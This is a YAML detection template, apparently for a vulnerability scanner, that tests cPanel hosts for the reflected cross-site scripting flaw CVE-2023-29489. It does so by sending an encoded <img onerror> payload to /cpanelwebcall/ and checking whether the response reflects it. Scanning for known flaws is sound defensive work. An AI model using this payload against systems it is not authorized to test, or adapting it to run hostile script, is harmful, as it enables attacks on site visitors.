name: yaml-poc-cpanel-cpanel-xss-CVE-2023-29489
binding: 81300676-0978-4928-9a2c-0dfd207c8a74
detail:
    author: jiapeng.han
    links:
        - https://blog.assetnote.io/2023/04/26/xss-million-websites-cpanel/
        - https://forums.cpanel.net/threads/cpanel-tsr-2023-0001-full-disclosure.708949/
    vulnerability:
        id: 345f09d7-5ed8-426d-aa0a-d4becf769664
        level: medium
    warning: Harmless
transport: http
set:
    s1: randomLowercase(8)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /cpanelwebcall/%3Cimg%20src=x%20onerror=%22prompt%281%29%22%3E{{s1}}
            follow_redirects: false
        expression: 'response.status == 400 && response.body_string.contains(''Invalid webcall ID: <img src=x onerror="prompt(1)">'' + s1)'
expression: r0()
